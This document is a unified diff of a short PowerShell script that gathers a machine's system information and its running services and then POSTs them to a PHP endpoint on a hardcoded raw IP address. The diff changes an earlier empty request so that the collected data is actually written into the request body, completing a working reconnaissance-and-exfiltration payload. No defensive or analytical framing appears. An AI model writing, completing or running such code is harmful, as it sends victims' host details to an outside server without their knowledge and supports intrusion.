@@ -1,12 +1,9 @@
-$infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;
+$infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;$infos = $infos + $task;
 
-
-
-$WebRequest = [System.Net.WebRequest]::Create("http://178.170.58.9/post.php")
-$WebRequest.Method = "POST"
-$WebRequest.ContentType = "application/json"
-$Response = $WebRequest.GetResponse()
-$ResponseStream = $Response.GetResponseStream()
-$ReadStream = New-Object System.IO.StreamReader $ResponseStream
-$Data=$ReadStream.ReadToEnd()
-
+$Body = [byte[]][char[]]$infos;
+$Request = [System.Net.HttpWebRequest]::Create('http://178.170.58.9/post.php');
+$Request.Method = 'POST';
+$Stream = $Request.GetRequestStream();
+$Stream.Write($Body, 0, $Body.Length);
+$Request.GetResponse();
+$Stream.Close();
